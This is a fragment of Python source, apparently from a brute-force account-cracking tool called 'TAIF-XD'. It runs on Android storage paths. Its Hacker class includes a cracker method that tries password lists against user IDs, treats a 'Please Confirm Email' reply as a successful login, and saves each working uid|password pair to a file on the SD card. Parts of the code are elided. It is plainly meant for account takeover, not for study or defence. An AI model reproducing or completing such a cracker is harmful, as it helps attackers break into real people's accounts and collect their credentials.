...
class Hacker:
    ...
    def settings(self):
       self.clear();print("⋙ Example : 12340 69000 990000");self.linex()
    ...
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r⋙  MATCHING ⋙ %s ⋙ OK ⋙ %s "%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              ...
              if "Please Confirm Email" in str(po):
                 print(f"\r\r⋙ TAIF-XD💚 ⋙\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/Taif-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
